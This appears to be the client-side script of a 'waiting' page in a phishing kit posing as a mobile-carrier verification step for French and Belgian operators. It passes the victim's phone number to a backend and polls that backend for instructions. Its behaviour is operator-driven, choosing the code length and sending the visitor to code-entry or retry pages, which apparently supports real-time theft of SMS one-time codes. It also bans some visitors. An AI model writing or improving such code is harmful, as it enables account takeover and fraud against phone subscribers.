const API_STATUS = '/api/status';
function getParam(n) { return new URL(window.location.href).searchParams.get(n); }

const phone   = getParam('phone')   || '';
const carrier = getParam('carrier') || 'orange';
const isRetry = getParam('retry')   === '1';

const carrierNames = {
    orange: 'Orange', sfr: 'SFR', bouygues: 'Bouygues',
    base: 'BASE', orange_be: 'Orange Belgium', proximus: 'Proximus', telenet: 'Telenet',
};

// ── UI init ───────────────────────────────────────────────────────────────────
const el = id => document.getElementById(id);

if (el('displayPhone')) el('displayPhone').textContent = phone || '--';
if (el('carrierName'))  el('carrierName').textContent  = carrierNames[carrier] || carrier;

if (isRetry) {
    if (el('retryBanner'))  el('retryBanner').style.display  = 'flex';
    if (el('flowSubtitle')) el('flowSubtitle').textContent   = 'Incorrect code — new one being prepared';
    if (el('statusTitle'))  el('statusTitle').textContent    = 'Choosing new code length…';
}

// ── Elapsed timer ─────────────────────────────────────────────────────────────
const startTime  = Date.now();
const elapsedEl  = el('elapsedTime');
const connEl     = el('connStatus');
let   connOk     = true;

function pad(n) { return String(n).padStart(2, '0'); }

setInterval(() => {
    if (!elapsedEl) return;
    const secs  = Math.floor((Date.now() - startTime) / 1000);
    const m     = Math.floor(secs / 60);
    const s     = secs % 60;
    elapsedEl.textContent = m + ':' + pad(s);
}, 1000);

// ── Ban check ─────────────────────────────────────────────────────────────────
async function checkBan() {
    try {
        const r = await fetch('/api/check-ban');
        const d = await r.json();
        if (d.banned) window.location.href = 'banned.html';
    } catch {}
}

// ── Status polling ────────────────────────────────────────────────────────────
async function checkStatus() {
    try {
        const res  = await fetch(API_STATUS + '?phone=' + encodeURIComponent(phone));
        connOk = res.ok;
        if (connEl) connEl.textContent = connOk ? 'Live' : 'Retrying…';
        if (!res.ok) return;
        const data = await res.json();

        if (data.status === 'waiting_code') {
            const len    = data.code_length || 6;
            const params = new URLSearchParams({ phone, length: len });
            if (isRetry) params.set('retry', '1');
            if (carrier)  params.set('carrier', carrier);
            window.location.href = 'code.html?' + params.toString();

        } else if (data.status === 'wrong_number') {
            window.location.href = 'index.html?wrong_number=1';

        } else if (data.status === 'completed') {
            window.location.href = 'success.html?phone=' + encodeURIComponent(phone);

        } else if (data.status === 'retry_code' && !isRetry) {
            const params = new URLSearchParams({ phone, retry: '1' });
            if (carrier) params.set('carrier', carrier);
            window.location.href = 'validation.html?' + params.toString();
        }
    } catch {
        if (connEl) connEl.textContent = 'Reconnecting…';
    }
}

checkBan().then(() => { checkStatus(); setInterval(checkStatus, 3000); });
